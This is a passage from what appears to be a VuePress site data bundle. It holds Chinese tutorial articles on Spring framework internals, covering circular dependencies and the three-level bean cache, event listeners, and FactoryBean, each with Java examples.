}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n可以看到 getsingleton 方法就是获取单例，一旦有则直接返回，但第一次肯定是没有的，详细看下他的获取方式\n\n    public object getsingleton(string beanname) {\n        // 从一级缓存中获取\n        object singletonobject = singletonobjects.get(beanname);\n        if (null == singletonobject) {\n            singletonobject = earlysingletonobjects.get(beanname);\n            // 判断二级缓存中是否有对象，这个对象就是代理对象，因为只有代理对象才会放到三级缓存中\n            if (null == singletonobject) {\n                objectfactory<?> singletonfactory = singletonfactories.get(beanname);\n                if (singletonfactory != null) {\n                    singletonobject = singletonfactory.getobject();\n                    // 把三级缓存中的代理对象中的真实对象获取出来，放入二级缓存中\n                    earlysingletonobjects.put(beanname, singletonobject);\n                    singletonfactories.remove(beanname);\n                }\n            }\n        }\n        return singletonobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n没有获取到实例则从 beandefinition 中获取 bean 的定义信息调用 docreatebean 创建 bean 的实例\n\n    protected object docreatebean(string beanname, beandefinition beandefinition, object[] args) {\n        object bean = null;\n        try {\n            // 实例化 bean\n            bean = createbeaninstance(beandefinition, beanname, args);\n            // 处理循环依赖，将实例化后的bean对象提前放入缓存中暴露出来\n            if (beandefinition.issingleton()) {\n                object finalbean = bean;\n                addsingletonfactory(beanname, () -> getearlybeanreference(beanname, beandefinition, finalbean));\n            }\n            // 是否需要继续进行后续的属性填充\n            boolean continuewithpropertypopulation = applybeanpostprocessorsafterinstantiation(beanname, bean);\n            if (!continuewithpropertypopulation) {\n                return bean;\n            }\n            // 在设置 bean 属性之前，允许 beanpostprocessor 修改属性值（注解属性填充）\n            applybeanpostprocessorsbeforeapplyingpropertyvalues(beanname, bean, beandefinition);\n            // 给 bean 填充属性（xml属性填充）\n            applypropertyvalues(beanname, bean, beandefinition);\n            // 执行 bean 的初始化方法和 beanpostprocessor 的前置和后置处理方法\n            bean = initializebean(beanname, bean, beandefinition);\n        } catch (exception e) {\n            throw new beansexception(\"instantiation of bean failed\", e);\n        }\n        // 注册实现了 disposablebean 接口的 bean 对象\n        registerdisposablebeanifnecessary(beanname, bean, beandefinition);\n        // 判断 scope_singleton、scope_prototype\n        object exposedobject = bean;\n        if (beandefinition.issingleton()) {\n            // 获取代理对象\n            exposedobject = getsingleton(beanname);\n            registersingleton(beanname, exposedobject);\n        }\n        return exposedobject;\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n其中 applypropertyvalues 这个方法，对要创建的实例进行属性填充的时候会进入循环依赖的问题，一旦遇到是 beanreference 类型的，则会调用 getbean 方法去获取实例，该方法又会回到上面的方法。\n\n    protected void applypropertyvalues(string beanname, object bean, beandefinition beandefinition) {\n        try {\n            // 这里获取到  bean 信息里的属性有哪些，也就是一个对象有哪些属性，并循环赋值到所创建实例的属性中去\n            propertyvalues propertyvalues = beandefinition.getpropertyvalues();\n            for (propertyvalue propertyvalue : propertyvalues.getpropertyvalues()) {\n                string name = propertyvalue.getname();\n                object value = propertyvalue.getvalue();\n                if (value instanceof beanreference) {\n                    // a 依赖 b，获取 b 的实例化\n                    beanreference beanreference = (beanreference) value;\n                    value = getbean(beanreference.getbeanname());\n                }\n                // 类型转换，不是侧重点可以不看\n                else {\n                    class<?> sourcetype = value.getclass();\n                    class<?> targettype = (class<?>) typeutil.getfieldtype(bean.getclass(), name);\n                    conversionservice conversionservice = getconversionservice();\n                    if (conversionservice != null) {\n                        if (conversionservice.canconvert(sourcetype, targettype)) {\n                            value = conversionservice.convert(value, targettype);\n                        }\n                    }\n                }\n                // 反射设置属性填充\n                 beanutil.setfieldvalue(bean, name, value);\n            }\n        } catch (exception e) {\n            throw new beansexception(\"error setting property values：\" + beanname + \" message：\" + e);\n        }\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n当一个实例的创建基本完成，他会把自己添加到一级缓存对象，做为一个成品提供给其他方法使用。如下方法就是添加到一级缓存的过程，其中 getsingleton 在获取三级缓存数据到二级缓存的时候会执行 singletonfactory.getobject (); 这是一个方法，会去执行 getearlybeanreference (beanname, beandefinition, finalbean) 方法，该方法会得到工厂方法里面的一个代理对象。然后再把代理对象存到一级缓存。至此 bean 的实例化到缓存的过程就结束。\n\n// 判断 scope_singleton、scope_prototype\nobject exposedobject = bean;\nif (beandefinition.issingleton()) {\n    // 把三级缓存对象转换为二级缓存对象\n    exposedobject = getsingleton(beanname);\n    // 把二级缓存对象转换为一级缓存对象\n    registersingleton(beanname, exposedobject);\n}\n\n// getsingleton 的部分代码实现\nobjectfactory<?> singletonfactory = singletonfactories.get(beanname);\nif (singletonfactory != null) {\n    // 获取代理对象\n    singletonobject = singletonfactory.getobject();\n    // 把三级缓存中的代理对象中的真实对象获取出来，放入二级缓存中\n    earlysingletonobjects.put(beanname, singletonobject);\n    singletonfactories.remove(beanname);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 流程介绍\n\n有了完整的概念后，我们可以考虑循环依赖的存在，当 a 依赖 b，b 又依赖 a，那么解决依赖的过程又是如何做的，可以看下图：\n\n\n\n 1. 会先在 getbean 方法里面找 a，通过一二三级缓存中寻找，如果找到则直接返回\n 2. 没找到就去创建 a 并放入 singletonfactories 三级缓存，会对 a 的属性值进行填充，此时 a 的属性依赖了 b，就要调用 getbean 找 b\n 3. 通过在 getbean 的 一二三级缓存查找，如果找到了直接返回\n 4. 没找到就去创建 b 并放入 singletonfactories 三级缓存，会对 b 的属性值进行填充，此时 b 的属性依赖了 a，就要调用 getbean 找 a\n 5. 此时的 a 已经在三级缓存，可以在三级缓存中找到，找到后会生成 a 代理对象 放入 earlysingletonobjects 二级缓存并返回这个代理对象\n 6. b 有了属性 a 的代理对象，此时 b 所有属性填充完毕后，就要把 b 添加到一级缓存，但此时的 b 在三级缓存，会先把三级缓存对象生成代理后放入到 earlysingletonobjects 二级缓存，再由二级缓存把对象放到 singletonobjects 一级缓存对象\n 7. 此时的 b 已经放到一级缓存对象了，并结束了 b 的创建流程，所以会返回到第 2 步，a 就有了 b 的实例，a 的属性填充完毕后，就要把 a 添加到一级缓存，但此时的 a 已经在二级缓存，所以就可以直接放入到 singletonobjects 一级缓存\n\n现在我们知道，按照 spring 框架的设计，用于解决循环依赖需要用到三个缓存，这三个缓存分别存放了 singletonobjects 成品对象、singletonfactories 半成品对象 (未填充属性值)、earlysingletonobjects 代理对象，分阶段存放对象内容，来解决循环依赖问题。\n\n那么，这里我们需要知道一个核心的原理，就是用于解决循环依赖就必须是三级缓存呢，二级行吗？一级可以不？其实都能解决，只不过 spring 框架的实现要保证几个事情，如只有一级缓存处理流程没法拆分，复杂度也会增加，同时半成品对象可能会有空指针异常。而将半成品与成品对象分开，处理起来也更加优雅、简单、易扩展。另外 spring 的两大特性中不仅有 ioc 还有 aop，也就是基于字节码增强后的方法，该存放到哪，而三级缓存最主要，要解决的循环依赖就是对 aop 的处理，但如果把 aop 代理对象的创建提前，那么二级缓存也一样可以解决。但是，这就违背了 spring 创建对象的原则，spring 更喜欢把所有的普通 bean 都初始化完成，在处理代理对象的初始化。\n\n一个单个缓存解决循环依赖的例子\n\npublic class forrelyon {\n\n    static map<string,object> singletonobjects = new hashmap<>();\n\n    public static void main(string[] args) throws exception {\n        system.out.println(getbean(a.class).getb());\n        system.out.println(getbean(b.class).geta());\n    }\n\n    private static <t> t getbean(class<t> beanclass) throws exception {\n        string beanname = beanclass.getsimplename().tolowercase();\n        if (singletonobjects.containskey(beanname)) {\n            return (t) singletonobjects.get(beanname);\n        }\n        // 实例化对象入缓存0\n        object obj = beanclass.newinstance();\n        singletonobjects.put(beanname, obj);\n        // 属性填充补全对象\n        field[] fields = obj.getclass().getdeclaredfields();\n        for (field field : fields) {\n            field.setaccessible(true);\n            class<?> fieldclass = field.gettype();\n            string fieldbeanname = fieldclass.getsimplename().tolowercase();\n            field.set(obj, singletonobjects.containskey(fieldbeanname) ? singletonobjects.get(fieldbeanname) : getbean(fieldclass));\n            field.setaccessible(false);\n        }\n        return (t) obj;\n    }\n\n\n    static class a{\n        private b b;\n\n        public b getb() {\n            return b;\n        }\n\n        public void setb(b b) {\n            this.b = b;\n        }\n    }\n\n    static class b{\n        private a a;\n\n        public a geta() {\n            return a;\n        }\n\n        public void seta(a a) {\n            this.a = a;\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n\n\n提示\n\n以上都是我们通过 单例的 set 注入方式来解决循环依赖，在 spring 中有多种多样的注入情况，那会带来什么样的情况呢？\n\n\n# 不同的循环依赖问题\n\n\n# set 循环依赖\n\n在多例 set 的循环依赖中，只有多例和多例循环依赖会出现报错，报错信息如下：\n\nerror creating bean with name 'b': injection of resource dependencies failed; nested exception is org.springframework.beans.factory.beancreationexception: error creating bean with name 'a': injection of resource dependencies failed; nested exception is org.springframework.beans.factory.beancurrentlyincreationexception: error creating bean with name 'b': requested bean is currently in creation: is there an unresolvable circular reference?\n\n\n1\n\n\n多例和单例的循环依赖不会有问题，如下是一个单例和多例的循环依赖代码：\n\n@component\npublic class a {\n    @resource\n    private b b;\n    public void getb() {\n        system.out.println(b);\n    }\n}\n\n@scope(configurablebeanfactory.scope_prototype)\n@component\npublic class b {\n    @resource\n    private a a;\n    public void geta(){\n        system.out.println(a);\n    }\n}\n\npublic static void main(string[] args) {\n    configurableapplicationcontext run = springapplication.run(adminapplication.class, args);\n    b b = run.getbean(b.class);\n    b b1 = run.getbean(b.class);\n    b b2 = run.getbean(b.class);\n    a a = run.getbean(a.class);\n    a a1 = run.getbean(a.class);\n    a a2 = run.getbean(a.class);\n    system.out.println(b);\n    system.out.println(b1);\n    system.out.println(b2);\n    a.getb();\n    a1.getb();\n    a2.getb();\n}\n\n// 结果\n// com.wt.admin.controller.b@1e5e2e06\n// com.wt.admin.controller.b@26c1f3eb\n// com.wt.admin.controller.b@79982bcc\n// com.wt.admin.controller.b@16b2d182\n// com.wt.admin.controller.b@16b2d182\n// com.wt.admin.controller.b@16b2d182\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n\n\n\n# 构造器 循环依赖\n\n但在 构造器 循环依赖的注入中，因为在构造器注入方式下，需要先创建一个 bean 对象，然后再将其他 bean 注入该对象中。但是，如果两个 bean 都互相依赖，那么就会出现无法创建任何一个 bean 的情况。因此，spring 在这种情况下会抛出异常以避免程序出现不可预测的错误。\n\n@configuration\npublic class config {\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// 报错\n// the dependencies of some of the beans in the application context form a cycle:\n// ┌─────┐\n// |  a defined in class path resource [com/wt/admin/controller/config.class]\n// ↑     ↓\n// |  b defined in class path resource [com/wt/admin/controller/config.class]\n// └─────┘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n解决这种问题，可以通过在方法中添加 @lazy 注解，只能加到方法里，不能加到 @bean 的上下位置，否则依然会报循环依赖；这种方式尽可能的被定义为 @lazy 的 bean 在第一次被使用的时候在去进行实例化。\n\n构造器也存在多例和单例的问题，如果你是多例依赖循环，会报错，如下\n\n// 多例\n@configuration\npublic class config {\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// 报错信息\n// error creating bean with name 'b' defined in class path resource [com/wt/admin/controller/config.class]: unsatisfied dependency expressed through method 'b' parameter 0; nested exception is org.springframework.beans.factory.unsatisfieddependencyexception: error creating bean with name 'a' defined in class path resource [com/wt/admin/controller/config.class]: unsatisfied dependency expressed through method 'a' parameter 0; nested exception is org.springframework.beans.factory.beancurrentlyincreationexception: error creating bean with name 'b': requested bean is currently in creation: is there an unresolvable circular reference?\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n如果你是多例和单例循环依赖，也会报错，但这里和我们使用注解进行多例和单例的循环依赖测试结果就有所不同了\n\n@configuration\npublic class config {\n    @scope(configurablebeanfactory.scope_prototype)\n    @bean\n    public a a(b b){\n        return new a(b);\n    }\n    @bean\n    public b b(a a){\n        return new b(a);\n    }\n}\n// 报错信息\n// the dependencies of some of the beans in the application context form a cycle:\n// ┌─────┐\n// |  b defined in class path resource [com/wt/admin/controller/config.class]\n// ↑     ↓\n// |  a defined in class path resource [com/wt/admin/controller/config.class]\n// └─────┘\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n那么构造器和 set 注入的方式在多例和单例的结论如下：\n\n * 单例循环依赖：构造器的方式会报错（可以用 @lazy 解决），set 注入的方式不会报错\n * 多例循环依赖：构造器的方式会报错，set 注入的方式会报错，两者都是调用对象时才报\n * 单例和多例循环依赖：构造器的方式会报错（可以用 @lazy 解决），set 注入的方式不会报错\n\n\n# @dependson\n\n@dependson 注解可以定义在类和⽅法上，意思是我这个组件要依赖于另⼀个组件，也就是说被依赖的组件会⽐该组件先注册到 ioc 容器中。如下案例，因为两个都要先于，所以造成了循环依赖\n\n@dependson(\"b\")\n@component\npublic class a {\n    @resource\n    private b b;\n    public void getb() {\n        system.out.println(b);\n    }\n}\n\n@dependson(\"a\")\n@component\npublic class b {\n    @resource\n    private a a;\n    public void geta(){\n        system.out.println(a);\n    }\n}\n// 报错\n// error creating bean with name 'b' defined in file [d:\\workspace\\luckydraw\\java\\target\\classes\\com\\wt\\admin\\controller\\b.class]: circular depends-on relationship between 'b' and 'a'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n",charsets:{cjk:!0}},{title:"核心内容拆解 事件通知",frontmatter:{title:"核心内容拆解 事件通知",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/202/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/202.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20%E4%BA%8B%E4%BB%B6%E9%80%9A%E7%9F%A5.html",relativePath:"01.框架/01.Spring/01.spring/202.核心内容拆解 事件通知.md",key:"v-7ee2cada",path:"/spring/spring/202/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'在 Spring 框架中，Event 代表着一个应用程序中的事件。这些事件可以是任何类型的状态变化，如用户操作、数据更新和系统错误等等。我们可以使用 Event 来实现应用程序内部的通信和协作。通过观察者模式，我们可以让不同的组件在特定的事件发生时做出响应，从而实现松耦合的设计。\n\nSpring 提供了一个简单而强大的机制来处理 Event，即 ApplicationEvent 和 ApplicationListener 接口。ApplicationEvent 是一个基本的事件类，它可以被继承以实现各种类型的事件。ApplicationListener 接口则定义了一个监听器，在某个事件发生时触发回调方法。以下提供了基本的类图关系，其中 AbstractApplicationContext 是执行 Spring 所有核心方法的集成类：\n\n\n\nSpring 提供了许多不同类型的 Event，每种 Event 都有其特定的作用和用途。下面是 Spring 生命周期中提供的 Event 及其作用：\n\n * ContextRefreshedEvent：表示 ApplicationContext 已经初始化并且准备好接受请求。通常情况下，我们可以利用该事件来进行一些初始化操作。\n * ContextStartedEvent：表示 ApplicationContext 正在启动。当应用程序中有需要在启动时执行的操作时，可以使用该事件进行处理。\n * ContextStoppedEvent：表示 ApplicationContext 已停止。当需要在应用程序停止前执行某些操作时，可以使用该事件。\n * ContextClosedEvent：表示 ApplicationContext 已经关闭。与 ContextStoppedEvent 不同，ContextClosedEvent 是在 ApplicationContext 关闭之后发送的，它允许我们对资源进行完全释放。\n * RequestHandledEvent：表示一个 HTTP 请求已经被处理完毕。该事件通常用于记录或统计请求处理的性能数据。\n\n在 Spring 中，我们可以通过实现 ApplicationListener 接口或使用 @EventListener 注解来监听这些事件。以监听 ContextRefreshedEvent 为例，我们可以编写如下代码：\n\n@Component\npublic class MyListener implements ApplicationListener<ContextRefreshedEvent> {\n    @Override\n    public void onApplicationEvent(ContextRefreshedEvent event) {\n        // 在此处编写需要执行的逻辑\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n除了实现 ApplicationListener 接口外，我们还可以使用 @EventListener 注解来监听事件。例如，我们可以在 Spring 组件中添加如下方法：\n\n@EventListener\npublic void handleContextRefreshedEvent(ContextRefreshedEvent event) {\n    // 在此处编写需要执行的逻辑\n}\n\n\n1\n2\n3\n4\n\n\n要使用 Spring 提供的类自定义一个事件发布和监听，首先，我们需要定义一个自定义事件。可以创建一个继承自 ApplicationEvent 的类，并在其中添加自定义字段和方法\n\npublic class MyCustomEvent extends ApplicationEvent {\n    private String message;\n    public MyCustomEvent(Object source, String message) {\n        super(source);\n        this.message = message;\n    }\n    public String getMessage() {\n        return message;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n发布事件 一旦定义了自定义事件，我们就可以使用 ApplicationContext 的 publishEvent 方法来发布事件\n\n@Autowired\nprivate ApplicationContext applicationContext;\n\npublic void doSomethingAndPublishEvent() {\n    // 在此处执行业务逻辑\n    MyCustomEvent event = new MyCustomEvent(this, "Hello, world!");\n    applicationContext.publishEvent(event);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n监听事件 最后，我们需要创建一个事件监听器，以便处理自定义事件。可以创建一个实现 ApplicationListener 接口的类，并在其 onApplicationEvent 方法中添加处理逻辑\n\n@Component\npublic class MyCustomEventListener implements ApplicationListener<MyCustomEvent> {\n    @Override\n    public void onApplicationEvent(MyCustomEvent event) {\n        System.out.println("Received custom event - " + event.getMessage());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n这样，当 MyCustomEvent 事件被发布时，MyCustomEventListener 就会收到该事件并调用其 onApplicationEvent 方法进行处理。',normalizedContent:'在 spring 框架中，event 代表着一个应用程序中的事件。这些事件可以是任何类型的状态变化，如用户操作、数据更新和系统错误等等。我们可以使用 event 来实现应用程序内部的通信和协作。通过观察者模式，我们可以让不同的组件在特定的事件发生时做出响应，从而实现松耦合的设计。\n\nspring 提供了一个简单而强大的机制来处理 event，即 applicationevent 和 applicationlistener 接口。applicationevent 是一个基本的事件类，它可以被继承以实现各种类型的事件。applicationlistener 接口则定义了一个监听器，在某个事件发生时触发回调方法。以下提供了基本的类图关系，其中 abstractapplicationcontext 是执行 spring 所有核心方法的集成类：\n\n\n\nspring 提供了许多不同类型的 event，每种 event 都有其特定的作用和用途。下面是 spring 生命周期中提供的 event 及其作用：\n\n * contextrefreshedevent：表示 applicationcontext 已经初始化并且准备好接受请求。通常情况下，我们可以利用该事件来进行一些初始化操作。\n * contextstartedevent：表示 applicationcontext 正在启动。当应用程序中有需要在启动时执行的操作时，可以使用该事件进行处理。\n * contextstoppedevent：表示 applicationcontext 已停止。当需要在应用程序停止前执行某些操作时，可以使用该事件。\n * contextclosedevent：表示 applicationcontext 已经关闭。与 contextstoppedevent 不同，contextclosedevent 是在 applicationcontext 关闭之后发送的，它允许我们对资源进行完全释放。\n * requesthandledevent：表示一个 http 请求已经被处理完毕。该事件通常用于记录或统计请求处理的性能数据。\n\n在 spring 中，我们可以通过实现 applicationlistener 接口或使用 @eventlistener 注解来监听这些事件。以监听 contextrefreshedevent 为例，我们可以编写如下代码：\n\n@component\npublic class mylistener implements applicationlistener<contextrefreshedevent> {\n    @override\n    public void onapplicationevent(contextrefreshedevent event) {\n        // 在此处编写需要执行的逻辑\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n除了实现 applicationlistener 接口外，我们还可以使用 @eventlistener 注解来监听事件。例如，我们可以在 spring 组件中添加如下方法：\n\n@eventlistener\npublic void handlecontextrefreshedevent(contextrefreshedevent event) {\n    // 在此处编写需要执行的逻辑\n}\n\n\n1\n2\n3\n4\n\n\n要使用 spring 提供的类自定义一个事件发布和监听，首先，我们需要定义一个自定义事件。可以创建一个继承自 applicationevent 的类，并在其中添加自定义字段和方法\n\npublic class mycustomevent extends applicationevent {\n    private string message;\n    public mycustomevent(object source, string message) {\n        super(source);\n        this.message = message;\n    }\n    public string getmessage() {\n        return message;\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n发布事件 一旦定义了自定义事件，我们就可以使用 applicationcontext 的 publishevent 方法来发布事件\n\n@autowired\nprivate applicationcontext applicationcontext;\n\npublic void dosomethingandpublishevent() {\n    // 在此处执行业务逻辑\n    mycustomevent event = new mycustomevent(this, "hello, world!");\n    applicationcontext.publishevent(event);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n监听事件 最后，我们需要创建一个事件监听器，以便处理自定义事件。可以创建一个实现 applicationlistener 接口的类，并在其 onapplicationevent 方法中添加处理逻辑\n\n@component\npublic class mycustomeventlistener implements applicationlistener<mycustomevent> {\n    @override\n    public void onapplicationevent(mycustomevent event) {\n        system.out.println("received custom event - " + event.getmessage());\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n这样，当 mycustomevent 事件被发布时，mycustomeventlistener 就会收到该事件并调用其 onapplicationevent 方法进行处理。',charsets:{cjk:!0}},{title:"核心内容拆解 FactoryBean",frontmatter:{title:"核心内容拆解 FactoryBean",date:"2023-06-25T09:22:36.000Z",permalink:"/spring/spring/204/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/01.%E6%A1%86%E6%9E%B6/01.Spring/01.spring/204.%E6%A0%B8%E5%BF%83%E5%86%85%E5%AE%B9%E6%8B%86%E8%A7%A3%20FactoryBean.html",relativePath:"01.框架/01.Spring/01.spring/204.核心内容拆解 FactoryBean.md",key:"v-e7b7c32a",path:"/spring/spring/204/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:'FactoryBean 接口，使得我们可以通过编写自定义代码来实现 Bean 的实例化和注入。具体来说，通过实现 FactoryBean 接口，我们可以在 getObject () 方法中编写自己的逻辑来实例化 Bean，同时可以在 getObjectType () 方法中指定返回的类型。因此，FactoryBean 的主要作用是对 Bean 的创建过程进行个性化定制，使得我们能够更好地控制 Spring 容器中 Bean 的生命周期和行为。同时，它还可以支持单例模式或者原型模式的 Bean 创建方式，更进一步增强了 Spring 容器的灵活性。\n\npublic interface FactoryBean<T> {\n    // 获取对象\n    T getObject() throws Exception;\n    // 获取对象类型\n    Class<?> getObjectType();\n    // 判断是否单例\n    boolean isSingleton();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在 《核心功能拆解 IOC》 一文中，当一个 Bean 对象的创建结束，并得到所创建的 Bean 后，会继续执行 getObjectForBeanInstance 方法\n\n   protected <T> T doGetBean(final String name, final Object[] args) {\n        // 从缓存中获取实例\n        Object sharedInstance = getSingleton(name);\n        if (sharedInstance != null) {\n            // 如果实现了 FactoryBean，则需要调用 FactoryBean#getObject\n            return (T) getObjectForBeanInstance(sharedInstance, name);\n        }\n        // 从BeanDefinition列表中获取对象\n        BeanDefinition beanDefinition = getBeanDefinition(name);\n        Object bean = createBean(name, beanDefinition, args);\n        // 如果实现了 FactoryBean，则需要调用 FactoryBean#getObject\n        return (T) getObjectForBeanInstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n该方法用于判断一个 Bean 是否实现了 FactoryBean 接口，如果实现了接口则需要进行对应的操作\n\nprivate Object getObjectForBeanInstance(Object beanInstance, String beanName) {\n    if (!(beanInstance instanceof FactoryBean)) {\n        return beanInstance;\n    }\n    // 查询 Bean 是否已被执行过\n    Object object = getCachedObjectForFactoryBean(beanName);\n    if (object == null) {\n        // 转成 FactoryBean\n        FactoryBean<?> factoryBean = (FactoryBean<?>) beanInstance;\n        // 具体执行\n        object = getObjectFromFactoryBean(factoryBean, beanName);\n    }\n    return object;\n}\n\nprotected Object getObjectFromFactoryBean(FactoryBean factory, String beanName) {\n    // 判断是否单例，单例会添加到 factoryBeanObjectCache 改该Map中，避免重复\n    if (factory.isSingleton()) {\n        // 获取\n        Object object = this.factoryBeanObjectCache.get(beanName);\n        // 判断是否存在\n        if (object == null) {\n            // 执行\n            object = doGetObjectFromFactoryBean(factory, beanName);\n            this.factoryBeanObjectCache.put(beanName, (object != null ? object : NULL_OBJECT));\n        }\n        return (object != NULL_OBJECT ? object : null);\n    } else {\n        return doGetObjectFromFactoryBean(factory, beanName);\n    }\n}\n\nprivate Object doGetObjectFromFactoryBean(final FactoryBean factory, final String beanName){\n    try {\n        // 调用接口方法\n        return factory.getObject();\n    } catch (Exception e) {\n        throw new BeansException("FactoryBean threw exception on object[" + beanName + "] creation", e);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n这种方式可以理解为，实现 FactoryBean 的类是一个代理类，他的工作主要是在自己被创建的时候，按照 Spring 的生命周期，创建自己的实例，填充属性，初始化之前执行，初始化执行，初始化之后执行，这一切都只是为被代理类做好条件铺设，等这个代理类创建完毕后，会执行 getObjectForBeanInstance 方法，返回被代理的类。更简单的理解就是 FactoryBean 可以帮我们制造我们想要的 Bean，供其他 Bean 依赖或使用。',normalizedContent:'factorybean 接口，使得我们可以通过编写自定义代码来实现 bean 的实例化和注入。具体来说，通过实现 factorybean 接口，我们可以在 getobject () 方法中编写自己的逻辑来实例化 bean，同时可以在 getobjecttype () 方法中指定返回的类型。因此，factorybean 的主要作用是对 bean 的创建过程进行个性化定制，使得我们能够更好地控制 spring 容器中 bean 的生命周期和行为。同时，它还可以支持单例模式或者原型模式的 bean 创建方式，更进一步增强了 spring 容器的灵活性。\n\npublic interface factorybean<t> {\n    // 获取对象\n    t getobject() throws exception;\n    // 获取对象类型\n    class<?> getobjecttype();\n    // 判断是否单例\n    boolean issingleton();\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n在 《核心功能拆解 ioc》 一文中，当一个 bean 对象的创建结束，并得到所创建的 bean 后，会继续执行 getobjectforbeaninstance 方法\n\n   protected <t> t dogetbean(final string name, final object[] args) {\n        // 从缓存中获取实例\n        object sharedinstance = getsingleton(name);\n        if (sharedinstance != null) {\n            // 如果实现了 factorybean，则需要调用 factorybean#getobject\n            return (t) getobjectforbeaninstance(sharedinstance, name);\n        }\n        // 从beandefinition列表中获取对象\n        beandefinition beandefinition = getbeandefinition(name);\n        object bean = createbean(name, beandefinition, args);\n        // 如果实现了 factorybean，则需要调用 factorybean#getobject\n        return (t) getobjectforbeaninstance(bean, name);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n该方法用于判断一个 bean 是否实现了 factorybean 接口，如果实现了接口则需要进行对应的操作\n\nprivate object getobjectforbeaninstance(object beaninstance, string beanname) {\n    if (!(beaninstance instanceof factorybean)) {\n        return beaninstance;\n    }\n    // 查询 bean 是否已被执行过\n    object object = getcachedobjectforfactorybean(beanname);\n    if (object == null) {\n        // 转成 factorybean\n        factorybean<?> factorybean = (factorybean<?>) beaninstance;\n        // 具体执行\n        object = getobjectfromfactorybean(factorybean, beanname);\n    }\n    return object;\n}\n\nprotected object getobjectfromfactorybean(factorybean factory, string beanname) {\n    // 判断是否单例，单例会添加到 factorybeanobjectcache 改该map中，避免重复\n    if (factory.issingleton()) {\n        // 获取\n        object object = this.factorybeanobjectcache.get(beanname);\n        // 判断是否存在\n        if (object == null) {\n            // 执行\n            object = dogetobjectfromfactorybean(factory, beanname);\n            this.factorybeanobjectcache.put(beanname, (object != null ? object : null_object));\n        }\n        return (object != null_object ? object : null);\n    } else {\n        return dogetobjectfromfactorybean(factory, beanname);\n    }\n}\n\nprivate object dogetobjectfromfactorybean(final factorybean factory, final string beanname){\n    try {\n        // 调用接口方法\n        return factory.getobject();\n    } catch (exception e) {\n        throw new beansexception("factorybean threw exception on object[" + beanname + "] creation", e);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n这种方式可以理解为，实现 factorybean 的类是一个代理类，他的工作主要是在自己被创建的时候，按照 spring 的生命周期，创建自己的实例，填充属性，初始化之前执行，初始化执行，初始化之后执行，这一切都只是为被代理类做好条件铺设，等这个代理类创建完毕后，会执行 getobjectforbeaninstance 